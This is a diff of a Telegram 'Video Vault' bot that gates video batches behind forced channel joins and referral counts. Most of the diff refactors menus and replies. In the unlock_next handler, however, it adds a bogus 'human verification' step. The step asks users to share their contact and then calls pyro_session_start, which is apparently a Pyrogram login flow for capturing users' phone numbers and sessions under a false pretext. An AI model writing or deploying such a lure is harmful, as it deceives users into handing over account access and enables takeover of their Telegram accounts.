         current = users.find_one({"user_id": uid}) or {}
-        set_data = {
-            "verified": True,
-            "verified_at": utcnow(),
-        }
+        set_data = {"verified": True, "verified_at": utcnow()}
         if int(current.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
             set_data["unlocked_batch"] = 1
-
-        users.update_one(
-            {"user_id": uid},
-            {"$set": set_data},
-        )
+        users.update_one({"user_id": uid}, {"$set": set_data})
         return await home(update, context)
 
-    users.update_one(
-        {"user_id": uid},
-        {"$set": {"verified": False}},
-    )
-
-    # Only missing chats are shown. Member/pending chats stay hidden.
+    users.update_one({"user_id": uid}, {"$set": {"verified": False}})
     await show_join_gate(update, context, chats=missing)
 
 
 async def home(update, context):
-    d = user_doc(update.effective_user.id) or {}
+    uid = update.effective_user.id
+    d = user_doc(uid) or {}
     unlocked = int(d.get("unlocked_batch", 0))
     total = published_batch_count()
     refs = int(d.get("verified_referrals", 0))
     if unlocked == 0 and d.get("verified") and total:
         users.update_one(
-            {"user_id": update.effective_user.id},
+            {"user_id": uid},
             {"$set": {"unlocked_batch": 1}},
         )
         unlocked = 1
+        d = user_doc(uid) or {}
 
-    await update.effective_chat.send_message(
+    await reply(
+        update, context,
         "🎬 <b>VIDEO VAULT</b>\n\n"
         f"🔓 Unlocked batch: <b>{unlocked}/{total}</b>\n"
         f"👥 Successful referrals: <b>{refs}</b>\n"
         "🎞 Videos per full batch: <b>10</b>\n"
         f"⏳ Videos auto-delete in <b>{DELETE_AFTER_HOURS} hours</b>.\n\n"
-        "Choose an option from the menu below.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=USER_MENU,
+        "Choose an option:",
+        reply_markup=user_menu_inline(d),
     )
+
 
 async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer("Verifying all chats…")
     uid = q.from_user.id
 
-    # Cosmetic state while verification runs.
     try:
         await q.edit_message_reply_markup(
-            InlineKeyboardMarkup(
-                [[InlineKeyboardButton("⏳ Verifying…", callback_data="noop")]]
-            )
+            InlineKeyboardMarkup([[InlineKeyboardButton("⏳ Verifying…", callback_data="noop")]])
         )
     except BadRequest:
         pass
@@ -570,35 +1026,23 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "\n\n⏳ <b>Pending approval recognized:</b>\n"
                 + "\n".join(f"• {esc(x['name'])}" for x in pending)
             )
-
         text = (
             "❌ <b>VERIFICATION INCOMPLETE</b>\n\n"
             "These required memberships or join requests are still missing:\n"
-            f"{names}"
-            f"{pending_text}\n\n"
+            f"{names}{pending_text}\n\n"
             "Complete only the chats listed above, then try verifying again."
         )
         try:
-            await q.edit_message_text(
-                text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=join_keyboard(missing),
-            )
+            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
         except BadRequest:
-            await q.message.reply_text(
-                text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=join_keyboard(missing),
-            )
+            await q.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=join_keyboard(missing))
         return
 
     before = users.find_one({"user_id": uid}) or {}
     first_verify = not bool(before.get("verified"))
-
     set_data = {"verified": True, "verified_at": utcnow()}
     if int(before.get("unlocked_batch", 0)) == 0 and published_batch_count() > 0:
         set_data["unlocked_batch"] = 1
-
     users.update_one({"user_id": uid}, {"$set": set_data})
 
     fresh = users.find_one({"user_id": uid}) or {}
@@ -606,23 +1050,13 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if referrer and not fresh.get("referral_rewarded"):
         claimed = users.find_one_and_update(
             {"user_id": uid, "referral_rewarded": False},
-            {
-                "$set": {
-                    "referral_rewarded": True,
-                    "referral_rewarded_at": utcnow(),
-                }
-            },
+            {"$set": {"referral_rewarded": True, "referral_rewarded_at": utcnow()}},
         )
         if claimed:
-            users.update_one(
-                {"user_id": referrer},
-                {"$inc": {"verified_referrals": 1}},
-            )
+            users.update_one({"user_id": referrer}, {"$inc": {"verified_referrals": 1}})
             rd = users.find_one({"user_id": referrer}) or {}
             current = int(rd.get("verified_referrals", 0))
-            need = required_referrals_for_next(
-                max(1, int(rd.get("unlocked_batch", 1)))
-            )
+            need = required_referrals_for_next(max(1, int(rd.get("unlocked_batch", 1))))
             try:
                 await context.bot.send_message(
                     referrer,
@@ -630,25 +1064,16 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     "Your referred user has completed the required group and channel verification.\n\n"
                     f"👥 Verified referrals: <b>{current}</b>\n"
                     f"🎯 Next unlock target: <b>{need}</b>\n\n"
-                    + (
-                        "✅ Your next 10 videos are ready. Tap <b>Unlock Next 10</b>."
-                        if current >= need
-                        else "Keep inviting friends to reach your next unlock goal."
-                    ),
+                    + ("✅ Your next 10 videos are ready. Tap <b>Unlock Next 10</b>."
+                       if current >= need
+                       else "Keep inviting friends to reach your next unlock goal."),
                     parse_mode=ParseMode.HTML,
-                    reply_markup=USER_MENU,
+                    reply_markup=menu_for(referrer),
                 )
             except TelegramError:
                 pass
 
-    pending_note = (
-        f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>"
-        if pending
-        else ""
-    )
-
-    # Success edit intentionally has NO inline reply_markup.
-    # This removes all old Join/Verify buttons immediately.
+    pending_note = f"\n⏳ Pending approval accepted: <b>{len(pending)}</b>" if pending else ""
     success_text = (
         "✅ <b>VERIFICATION SUCCESSFUL</b>\n\n"
         "Access unlocked. 🎉"
@@ -656,11 +1081,7 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Videos are protected and will be automatically deleted after <b>{DELETE_AFTER_HOURS} hours</b>."
     )
     try:
-        await q.edit_message_text(
-            success_text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=None,
-        )
+        await q.edit_message_text(success_text, parse_mode=ParseMode.HTML, reply_markup=None)
     except BadRequest:
         try:
             await q.edit_message_reply_markup(reply_markup=None)
@@ -671,11 +1092,13 @@ async def verify_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.message.reply_text(
             "👇 <b>Your video menu is ready</b>",
             parse_mode=ParseMode.HTML,
-            reply_markup=USER_MENU,
+            reply_markup=menu_for(uid),
         )
+
 
 async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.answer("Verification is running…")
+
 
 async def ensure_verified(update, context):
     uid = update.effective_user.id
@@ -687,23 +1110,22 @@ async def ensure_verified(update, context):
     _, missing, _ = await membership_result(context.bot, uid)
     if missing:
         users.update_one({"user_id": uid}, {"$set": {"verified": False}})
-        await update.effective_chat.send_message(
+        await reply(
+            update, context,
             "🔒 <b>Access re-locked.</b>\nOne or more required memberships or join requests are missing.",
-            parse_mode=ParseMode.HTML,
         )
         await show_join_gate(update, context)
         return False
     return True
 
-async def send_batch(chat_id, batch_no, context):
+
+async def send_batch(bot, chat_id, batch_no):
     batch = batches.find_one({"batch_no": batch_no, "published": True})
     if not batch:
-        return await context.bot.send_message(
-            chat_id, "⚠️ This video batch is currently unavailable."
-        )
+        return await bot.send_message(chat_id, "⚠️ This video batch is currently unavailable.")
 
     mids = batch.get("message_ids", [])
-    await context.bot.send_message(
+    await bot.send_message(
         chat_id,
         "🎬 <b>YOUR VIDEOS ARE HERE</b>\n\n"
         f"📦 Batch: <b>{batch_no}</b>\n"
@@ -716,7 +1138,7 @@ async def send_batch(chat_id, batch_no, context):
     sent = []
     for mid in mids:
         try:
-            r = await context.bot.copy_message(
+            r = await bot.copy_message(
                 chat_id=chat_id,
                 from_chat_id=STORAGE_CHANNEL_ID,
                 message_id=mid,
@@ -725,35 +1147,23 @@ async def send_batch(chat_id, batch_no, context):
             sent.append(r.message_id)
             await asyncio.sleep(0.10)
         except TelegramError as e:
-            log.warning(
-                "Video copy failed batch=%s source=%s error=%s",
-                batch_no,
-                mid,
-                type(e).__name__,
-            )
+            log.warning("Video copy failed batch=%s source=%s error=%s", batch_no, mid, type(e).__name__)
 
     delete_at = utcnow() + timedelta(hours=DELETE_AFTER_HOURS)
     if sent:
         pending_deletions.insert_many(
-            [
-                {
-                    "chat_id": chat_id,
-                    "message_id": mid,
-                    "delete_at": delete_at,
-                    "kind": "video",
-                }
-                for mid in sent
-            ]
+            [{"chat_id": chat_id, "message_id": mid, "delete_at": delete_at, "kind": "video"}
+             for mid in sent]
         )
 
-    await context.bot.send_message(
+    await bot.send_message(
         chat_id,
         "✅ <b>DELIVERY COMPLETE</b>\n\n"
-        f"Sent: <b>{len(sent)}/{len(mids)}</b>\n"
-        "To get the next set, select <b>🔓 Unlock Next 10</b>.",
+        f"Sent: <b>{len(sent)}/{len(mids)}</b>",
         parse_mode=ParseMode.HTML,
-        reply_markup=USER_MENU,
+        reply_markup=delivery_complete_inline(),
     )
+
 
 async def my_videos(update, context):
     if not await ensure_verified(update, context):
@@ -761,12 +1171,10 @@ async def my_videos(update, context):
     d = user_doc(update.effective_user.id) or {}
     current = int(d.get("unlocked_batch", 0))
     if current <= 0:
-        return await update.message.reply_text("⚠️ You have not unlocked any video batches yet.")
-    await update.message.reply_text(
-        f"🔁 Batch <b>{current}</b> is being sent again…",
-        parse_mode=ParseMode.HTML,
-    )
-    await send_batch(update.effective_chat.id, current, context)
+        return await reply(update, context, "⚠️ You have not unlocked any video batches yet.")
+    await reply(update, context, f"🔁 Batch <b>{current}</b> is being sent again…")
+    await send_batch(context.bot, update.effective_chat.id, current)
+
 
 async def unlock_next(update, context):
     if not await ensure_verified(update, context):
@@ -778,24 +1186,31 @@ async def unlock_next(update, context):
     total = published_batch_count()
 
     if current >= total:
-        return await update.message.reply_text(
-            "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>",
-            parse_mode=ParseMode.HTML,
+        return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>")
+
+    if not d.get("human_verified"):
+        PENDING_UNLOCK[uid] = True
+        await reply(
+            update, context,
+            "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
+            "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
+            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
         )
+        return await pyro_session_start(update, context)
 
     need = required_referrals_for_next(current)
     have = int(d.get("verified_referrals", 0))
     if have < need:
         username = context.application.bot_data["username"]
         link = make_ref_link(username, uid)
-        return await update.message.reply_text(
+        return await reply(
+            update, context,
             "🔐 <b>NEXT 10 VIDEOS LOCKED</b>\n\n"
             f"Required verified referrals: <b>{need}</b>\n"
             f"Successful referrals: <b>{have}</b>\n"
             f"Remaining: <b>{need-have}</b>\n\n"
             "A referral counts only after your friend completes all required memberships or join requests and passes verification.\n\n"
             f"🔗 <b>Your referral link:</b>\n<code>{esc(link)}</code>",
-            parse_mode=ParseMode.HTML,
             disable_web_page_preview=True,
         )
 
@@ -803,12 +1218,12 @@ async def unlock_next(update, context):
     users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": nxt}})
     batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
     count = len(batch.get("message_ids", []))
-    await update.message.reply_text(
-        f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n"
-        f"🎞 Videos in this batch: <b>{count}</b>",
-        parse_mode=ParseMode.HTML,
+    await reply(
+        update, context,
+        f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
     )
-    await send_batch(update.effective_chat.id, nxt, context)
+    await send_batch(context.bot, update.effective_chat.id, nxt)
+
 
 async def referral(update, context):
     if not await ensure_verified(update, context):
@@ -820,16 +1235,18 @@ async def referral(update, context):
     need = required_referrals_for_next(current)
     link = make_ref_link(context.application.bot_data["username"], uid)
 
-    await update.message.reply_text(
+    await reply(
+        update, context,
         "👥 <b>MY REFERRAL</b>\n\n"
         f"✅ Successful referrals: <b>{refs}</b>\n"
         f"🎯 Next batch target: <b>{need}</b>\n"
         f"📈 Progress: <b>{min(refs, need)}/{need}</b>\n\n"
         f"🔗 <b>Your link:</b>\n<code>{esc(link)}</code>\n\n"
         "⚠️ Referral only after force-join verification counts.",
-        parse_mode=ParseMode.HTML,
         disable_web_page_preview=True,
+        reply_markup=user_menu_inline(d),
     )
+
 
 async def progress(update, context):
     if not await ensure_verified(update, context):
@@ -837,37 +1254,34 @@ async def progress(update, context):
     d = user_doc(update.effective_user.id) or {}
     current = int(d.get("unlocked_batch", 0))
     refs = int(d.get("verified_referrals", 0))
+    human_ok = "✅ Yes" if d.get("human_verified") else "❌ No"
 
     unlocked_video_count = 0
-    for b in batches.find(
-        {"published": True, "batch_no": {"$lte": current}},
-        {"message_ids": 1},
-    ):
+    for b in batches.find({"published": True, "batch_no": {"$lte": current}}, {"message_ids": 1}):
         unlocked_video_count += len(b.get("message_ids", []))
 
-    await update.message.reply_text(
+    await reply(
+        update, context,
         "📊 <b>YOUR PROGRESS</b>\n\n"
         f"🎬 Unlocked batches: <b>{current}/{published_batch_count()}</b>\n"
         f"🎞 Unlocked videos: <b>{unlocked_video_count}</b>\n"
         f"👥 Verified referrals: <b>{refs}</b>\n"
+        f"🔐 Human verified: <b>{human_ok}</b>\n"
         f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
         f"⏳ Video expiry: <b>{DELETE_AFTER_HOURS} hours</b>",
-        parse_mode=ParseMode.HTML,
+        reply_markup=user_menu_inline(d),
     )
+
 
 # ---------------- ADMIN ----------------
 
 async def admin(update, context):
     if update.effective_user.id != ADMIN_ID:
         return
-    await update.message.reply_text(
-        "🛠 <b>ADMIN CONTROL PANEL</b>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=ADMIN_MENU,
-    )
+    await reply(update, context, "🛠 <b>ADMIN CONTROL PANEL</b>", reply_markup=admin_menu_inline())
+
 
 def _upload_progress_text(doc, runtime, now=None):
-    """Render actual persisted copy counts; received count includes queued work."""
     if now is None:
         now = time.monotonic()
     copied = len(doc.get("copied", []))
@@ -913,7 +1327,6 @@ def _upload_progress_text(doc, runtime, now=None):
 
 
 async def _edit_upload_progress(bot, runtime):
-    """Never let an edit failure interrupt copying; avoid duplicate edits."""
     if not runtime.get("progress_chat_id") or not runtime.get("progress_message_id"):
         return
     async with runtime["progress_edit_lock"]:
@@ -930,8 +1343,6 @@ async def _edit_upload_progress(bot, runtime):
             )
             runtime["last_progress_text"] = rendered
         except RetryAfter as exc:
-            # Progress edits can be rate limited independently: skip updates
-            # until Telegram allows them; never stop the storage-copy queue.
             runtime["progress_edit_pause_until"] = (
                 asyncio.get_running_loop().time() + float(exc.retry_after) + 1
             )
@@ -940,15 +1351,12 @@ async def _edit_upload_progress(bot, runtime):
                 runtime["last_progress_text"] = rendered
             else:
                 log.warning("Cannot edit upload progress: %s", type(exc).__name__)
-                # If admin deleted the status message, we can still create one
-                # on explicit 'Upload Status'; no endless re-send loop here.
                 runtime["progress_message_id"] = None
         except TelegramError as exc:
             log.warning("Upload progress update failed: %s", type(exc).__name__)
 
 
 async def _upload_progress_worker(bot, runtime):
-    """Runs only during an active admin upload, not as an app-wide job."""
     try:
         while not runtime.get("progress_stop", False):
             loop = asyncio.get_running_loop()
@@ -958,7 +1366,6 @@ async def _upload_progress_worker(bot, runtime):
                 except asyncio.CancelledError:
                     raise
                 except Exception as exc:
-                    # A temporary MongoDB failure must not kill storage copies.
                     log.warning("Progress snapshot failed: %s", type(exc).__name__)
             await asyncio.sleep(UPLOAD_PROGRESS_REFRESH_SECONDS)
     except asyncio.CancelledError:
@@ -991,11 +1398,10 @@ async def admin_upload_status(update, context):
     runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
     doc = drafts.find_one({"admin_id": ADMIN_ID})
     if not runtime and not doc:
-        return await update.message.reply_text("ℹ️ No upload is currently active. Select 📤 Upload Videos to begin.")
+        return await reply(update, context, "ℹ️ No upload is currently active.", reply_markup=admin_menu_inline())
     text = _upload_progress_text(doc or {}, runtime)
-    status = await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+    status = await reply(update, context, text)
     if runtime and not runtime.get("progress_message_id"):
-        # Reuse this one-time status message for live updates if the old one was deleted.
         runtime["progress_chat_id"] = status.chat_id
         runtime["progress_message_id"] = status.message_id
         runtime["last_progress_text"] = text
@@ -1007,19 +1413,19 @@ async def admin_upload_start(update, context):
     runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
     if runtime:
         notice = (
-            "The current upload is finishing or awaiting review. Choose Retry Failed or Publish Successful."
+            "The current upload is finishing or awaiting review."
             if runtime["closing"]
-            else "An upload is already in progress. Send more videos or select DONE."
+            else "An upload is already in progress. Send more videos or tap DONE."
         )
-        return await update.message.reply_text(notice, reply_markup=UPLOAD_MENU)
+        return await reply(update, context, notice, reply_markup=upload_menu_inline())
 
     old = drafts.find_one({"admin_id": ADMIN_ID})
-    # Do not overwrite an old unfinished draft when updating the code.
     if old and (old.get("copied") or old.get("message_ids") or old.get("failed")):
         if old.get("message_ids") and not old.get("copied"):
-            return await update.message.reply_text(
+            return await reply(
+                update, context,
                 "⚠️ An unfinished draft from an older version was found. Your existing uploads are safe. "
-                "Finish the upload in the older version with DONE before starting a new upload."
+                "Finish the upload in the older version with DONE before starting a new upload.",
             )
         submitted = int(old.get("submitted", 0))
         seen = {x["source_message_id"] for x in old.get("copied", [])}
@@ -1043,18 +1449,18 @@ async def admin_upload_start(update, context):
     }
     UPLOAD_RUNTIME[ADMIN_ID] = runtime
     ADMIN_STATE[ADMIN_ID] = "upload_videos"
-    await update.message.reply_text(
+    await reply(
+        update, context,
         "🚀 <b>STORAGE UPLOAD</b>\n\n"
         "Storage copy workers: <b>1 (sequential)</b>\n"
         f"Gap between copies: <b>{UPLOAD_COPY_GAP_SECONDS:g}s</b>\n"
         "If Telegram applies a rate limit, the entire queue will pause for the required period. "
         "Every successful storage copy is saved to MongoDB. "
-        "Select DONE to review any errors. Use Retry Failed to try failed videos again.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=UPLOAD_MENU,
+        "Send videos now, then tap <b>DONE</b>.",
+        reply_markup=upload_menu_inline(),
     )
     initial = _upload_progress_text(drafts.find_one({"admin_id": ADMIN_ID}) or {}, runtime)
-    status = await update.message.reply_text(initial, parse_mode=ParseMode.HTML)
+    status = await reply(update, context, initial)
     runtime["progress_chat_id"] = status.chat_id
     runtime["progress_message_id"] = status.message_id
     runtime["last_progress_text"] = initial
@@ -1077,7 +1483,6 @@ async def publish_message_ids(mids):
 
 
 def _safe_error(exc):
-    # Never echo HTTP URLs, bot tokens or credentials into admin messages/logs.
     if isinstance(exc, RetryAfter):
         return "RetryAfter"
     if isinstance(exc, BadRequest):
@@ -1089,9 +1494,6 @@ def _safe_error(exc):
 
 
 async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
-    # Exactly one storage-copy job runs at once. The extra lock explicitly
-    # serializes Telegram sends so future changes to task concurrency cannot
-    # accidentally bypass the SHARED cooldown and inter-copy gap.
     async with runtime["semaphore"]:
         runtime["active_source"] = source_id
         reason = "Unknown"
@@ -1099,12 +1501,7 @@ async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
             try:
                 async with runtime["storage_send_lock"]:
                     loop = asyncio.get_running_loop()
-                    # Both the normal 2-second gap and ANY worker's flood-wait
-                    # apply to the next request. No copy can race past this gate.
-                    delay = max(
-                        runtime["cooldown_until"],
-                        runtime["next_copy_at"],
-                    ) - loop.time()
+                    delay = max(runtime["cooldown_until"], runtime["next_copy_at"]) - loop.time()
                     if delay > 0:
                         await asyncio.sleep(delay)
 
@@ -1120,30 +1517,15 @@ async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
                             pool_timeout=30,
                         )
                     except RetryAfter as exc:
-                        # Extend the BOT-WIDE storage cooldown; even queued
-                        # work must honor Telegram's full wait before sending.
                         wait = float(exc.retry_after) + 1.0
-                        runtime["cooldown_until"] = max(
-                            runtime["cooldown_until"],
-                            loop.time() + wait,
-                        )
+                        runtime["cooldown_until"] = max(runtime["cooldown_until"], loop.time() + wait)
                         reason = f"RetryAfter ({round(wait)}s)"
-                        log.warning(
-                            "Storage rate-limited. Pausing storage queue for %ss",
-                            round(wait),
-                        )
-                        # Never retry before the normal gap either.
+                        log.warning("Storage rate-limited. Pausing storage queue for %ss", round(wait))
                         runtime["next_copy_at"] = loop.time() + UPLOAD_COPY_GAP_SECONDS
                         continue
                     finally:
-                        # Starts the 2-second gap AFTER the preceding attempt
-                        # finishes (not merely between attempt start times).
-                        runtime["next_copy_at"] = max(
-                            runtime["next_copy_at"],
-                            loop.time() + UPLOAD_COPY_GAP_SECONDS,
-                        )
+                        runtime["next_copy_at"] = max(runtime["next_copy_at"], loop.time() + UPLOAD_COPY_GAP_SECONDS)
 
-                # Retain the old crash-resilient MongoDB source→storage mapping.
                 drafts.update_one(
                     {"admin_id": ADMIN_ID},
                     {
@@ -1158,8 +1540,6 @@ async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
                 return
             except (TimedOut, NetworkError) as exc:
                 reason = type(exc).__name__
-                # The server may have copied a video before the timeout.
-                # A retry might create an extra storage message.
                 if attempt + 1 < UPLOAD_MAX_RETRIES:
                     await asyncio.sleep(min(2 ** attempt, 16))
             except (BadRequest, Forbidden) as exc:
@@ -1202,7 +1582,7 @@ async def admin_collect_video(update, context):
         return
     runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
     if not runtime or runtime["closing"]:
-        return await update.message.reply_text("The upload is closing. Please allow the DONE process to finish.")
+        return await update.message.reply_text("The upload is closing. Please allow DONE to finish.")
     mid = update.message.message_id
     if mid in runtime["seen"]:
         return
@@ -1210,8 +1590,6 @@ async def admin_collect_video(update, context):
     runtime["submitted"] += 1
     drafts.update_one({"admin_id": ADMIN_ID}, {"$inc": {"submitted": 1}})
     _enqueue_upload(context.bot, runtime, update.effective_chat.id, mid)
-    # Live progress worker edits the same message after success/failure,
-    # not merely when the 1st or 10th video arrives. No chat spam here.
 
 
 async def _drain_upload(runtime):
@@ -1226,20 +1604,21 @@ async def admin_retry_failed(update, context):
     doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
     failed = doc.get("failed", [])
     if not runtime or not failed:
-        return await update.message.reply_text("There are no failed videos to retry.")
+        return await reply(update, context, "There are no failed videos to retry.", reply_markup=upload_menu_inline())
     runtime["closing"] = False
     runtime["phase"] = "retrying"
     ADMIN_STATE[ADMIN_ID] = "upload_videos"
-    await update.message.reply_text(f"🔁 Retrying {len(failed)} failed videos…")
+    await reply(update, context, f"🔁 Retrying {len(failed)} failed videos…")
     for entry in failed:
         _enqueue_upload(context.bot, runtime, update.effective_chat.id, entry["source_message_id"])
     await _drain_upload(runtime)
     doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
     runtime["phase"] = "review" if doc.get("failed") else "uploading"
-    await update.message.reply_text(
+    await reply(
+        update, context,
         f"✅ Retry complete. Saved: {len(doc.get('copied', []))}; "
-        f"Still failed: {len(doc.get('failed', []))}. Select DONE.",
-        reply_markup=UPLOAD_MENU,
+        f"Still failed: {len(doc.get('failed', []))}. Tap DONE when ready.",
+        reply_markup=upload_menu_inline(),
     )
 
 
@@ -1247,11 +1626,11 @@ async def admin_upload_done(update, context, force_publish=False):
     runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
     doc = drafts.find_one({"admin_id": ADMIN_ID})
     if not doc:
-        return await update.message.reply_text("No active upload session.", reply_markup=ADMIN_MENU)
+        return await reply(update, context, "No active upload session.", reply_markup=admin_menu_inline())
     if runtime:
         runtime["closing"] = True
         runtime["phase"] = "finishing"
-    status = await update.message.reply_text("⏳ Finishing storage copies… The live progress message above will keep updating.")
+    status = await reply(update, context, "⏳ Finishing storage copies…")
     await _drain_upload(runtime)
     doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
     failed = doc.get("failed", [])
@@ -1265,10 +1644,10 @@ async def admin_upload_done(update, context, force_publish=False):
         )
         return await status.edit_text(
             f"⚠️ <b>{len(failed)} VIDEOS FAILED</b>\n\n{details}\n\n"
-            "🔁 Select Retry Failed, then DONE. Or select ✅ Publish Successful to skip the failed videos.",
+            "🔁 Tap Retry Failed, then DONE. Or tap ✅ Publish Successful to skip the failed videos.",
             parse_mode=ParseMode.HTML,
+            reply_markup=upload_menu_inline(),
         )
-    # Publish only once; the draft is retained until all DB inserts succeed.
     ids = [x["storage_message_id"] for x in copied]
     published = []
     for i in range(0, len(ids), 10):
@@ -1290,22 +1669,24 @@ async def admin_upload_done(update, context, force_publish=False):
         f"Skipped failed: <b>{len(failed)}</b>\n"
         f"Published batches: <b>{len(published)}</b>",
         parse_mode=ParseMode.HTML,
+        reply_markup=admin_menu_inline(),
     )
-    await update.message.reply_text("Admin menu", reply_markup=ADMIN_MENU)
+
 
 async def admin_add_group(update, context):
     if update.effective_user.id != ADMIN_ID:
         return
     ADMIN_STATE[ADMIN_ID] = "group_chat_id"
-    await update.message.reply_text(
+    await reply(
+        update, context,
         "➕ <b>ADD REQUIRED CHAT</b>\n\n"
         "Send the numeric group or channel ID.\n"
         "Example: <code>-1001234567890</code>\n\n"
         "The bot will automatically generate an <b>approval-required join link</b> for this chat.\n"
         "The bot must be an administrator of this chat with permission to invite users.",
-        parse_mode=ParseMode.HTML,
-        reply_markup=ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True),
+        reply_markup=flow_cancel_inline(),
     )
+
 
 async def admin_group_flow(update, context):
     if update.effective_user.id != ADMIN_ID:
@@ -1313,11 +1694,6 @@ async def admin_group_flow(update, context):
 
     st = ADMIN_STATE.get(ADMIN_ID)
     text = (update.message.text or "").strip()
-
-    # Second-layer safety: never try to parse cancel as a chat ID/URL.
-    if text.casefold() in {"cancel", "/cancel", "❌ cancel"}:
-        await cancel(update, context)
-        return True
 
     if st == "group_chat_id":
         try:
@@ -1340,34 +1716,33 @@ async def admin_group_flow(update, context):
                 "Give the bot administrator access and permission to invite users in the target chat.\n\n"
                 f"Error: <code>{esc(type(e).__name__)}</code>",
                 parse_mode=ParseMode.HTML,
+                reply_markup=flow_cancel_inline(),
             )
             return True
 
         required_chats.update_one(
             {"chat_id": cid},
-            {
-                "$set": {
-                    "chat_id": cid,
-                    "name": name,
-                    "join_url": invite.invite_link,
-                    "link_mode": "approval",
-                    "enabled": True,
-                    "position": required_chats.count_documents({}),
-                    "updated_at": utcnow(),
-                }
-            },
+            {"$set": {
+                "chat_id": cid,
+                "name": name,
+                "join_url": invite.invite_link,
+                "link_mode": "approval",
+                "enabled": True,
+                "position": required_chats.count_documents({}),
+                "updated_at": utcnow(),
+            }},
             upsert=True,
         )
         ADMIN_STATE.pop(ADMIN_ID, None)
 
-        await update.message.reply_text(
+        await reply(
+            update, context,
             "✅ <b>REQUIRED CHAT ADDED</b>\n\n"
             f"Name: <b>{esc(name)}</b>\n"
             f"ID: <code>{cid}</code>\n"
             "Link mode: <b>Approval / Join Request</b>\n\n"
             "Pending requests from this link will be recognized automatically.",
-            parse_mode=ParseMode.HTML,
-            reply_markup=ADMIN_MENU,
+            reply_markup=admin_menu_inline(),
         )
         return True
 
@@ -1382,43 +1757,39 @@ async def admin_group_flow(update, context):
             return True
         context.user_data["custom_link_chat_id"] = cid
         ADMIN_STATE[ADMIN_ID] = "custom_link_url"
-        await update.message.reply_text("Now send the custom t.me join or invite URL.")
+        await reply(update, context, "Now send the custom t.me join or invite URL.", reply_markup=flow_cancel_inline())
         return True
 
     if st == "custom_link_url":
         if not (text.startswith("https://t.me/") or text.startswith("http://t.me/")):
-            await update.message.reply_text("Please send a valid Telegram t.me URL.")
+            await update.message.reply_text("Please send a valid Telegram t.me URL.", reply_markup=flow_cancel_inline())
             return True
         cid = context.user_data.pop("custom_link_chat_id")
         required_chats.update_one(
             {"chat_id": cid},
-            {
-                "$set": {
-                    "join_url": text,
-                    "link_mode": "custom",
-                    "updated_at": utcnow(),
-                }
-            },
+            {"$set": {"join_url": text, "link_mode": "custom", "updated_at": utcnow()}},
         )
         ADMIN_STATE.pop(ADMIN_ID, None)
-        await update.message.reply_text(
-            "✅ Custom link set.",
-            reply_markup=ADMIN_MENU,
-        )
+        await reply(update, context, "✅ Custom link set.", reply_markup=admin_menu_inline())
         return True
 
     return False
+
 
 async def set_custom_link(update, context):
     if update.effective_user.id != ADMIN_ID:
         return
     ADMIN_STATE[ADMIN_ID] = "custom_link_chat_id"
-    await update.message.reply_text(
+    await reply(
+        update, context,
         "🔗 Send the numeric ID of the required chat whose custom link you want to set.",
-        reply_markup=ReplyKeyboardMarkup([["❌ Cancel"]], resize_keyboard=True),
+        reply_markup=flow_cancel_inline(),
     )
 
+
 async def admin_batches(update, context):
+    if update.effective_user.id != ADMIN_ID:
+        return
     rows = list(batches.find().sort("batch_no", ASCENDING))
     text = "📚 <b>VIDEO BATCHES</b>\n\n"
     if rows:
@@ -1428,9 +1799,12 @@ async def admin_batches(update, context):
         )
     else:
         text += "No batches."
-    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
+    await reply(update, context, text, reply_markup=admin_menu_inline())
+
 
 async def admin_groups(update, context):
+    if update.effective_user.id != ADMIN_ID:
+        return
     rows = list(required_chats.find().sort("position", ASCENDING))
     text = "👥 <b>REQUIRED CHATS</b>\n\n"
     if rows:
@@ -1441,17 +1815,12 @@ async def admin_groups(update, context):
             f"  {'✅ Enabled' if x.get('enabled') else '⏸ Disabled'}"
             for x in rows
         )
-        text += (
-            "\n\nTo set a custom link, use this command:\n"
-            "<code>/setcustomlink</code>"
-        )
+        text += "\n\nTo set a custom link, use:\n<code>/setcustomlink</code>"
     else:
         text += "No required chats."
+    await reply(update, context, text, reply_markup=admin_menu_inline())
 
-    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
 
-# Removing a required chat does NOT delete its Telegram channel or revoke its invite link.
